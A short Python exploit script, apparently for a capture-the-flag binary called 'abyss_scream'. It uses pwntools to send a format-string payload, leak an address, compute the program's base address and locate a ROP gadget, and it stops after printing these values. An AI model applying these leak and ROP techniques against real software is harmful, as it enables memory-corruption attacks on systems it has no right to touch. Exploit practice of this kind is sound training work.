from pwn import *
from Crypto.Util.number import long_to_bytes,bytes_to_long
from decimal import Decimal, getcontext
from struct import pack
io = process('./abyss_scream')
elf_file = ELF('./abyss_scream')
libc = ELF('libc.so.6')

io.recvuntil(b'input:')
io.sendline(b'x')
io.recvuntil(b'name:')
io.sendline(b'ffff')
io.sendlineafter(b'message:',b'%43$p')
io.recvuntil(b'0x')
rop_libc = ROP(libc)
rop_elf = ROP(elf_file)
elf_file.address = int(io.recvline(keepends=False), 16) - (elf_file.sym['main'] + 128)

pop_rdi = elf_file.address + rop_elf.find_gadget(['pop rdi','ret'])[0]
print(pop_rdi)
print(elf_file.symbols['main'])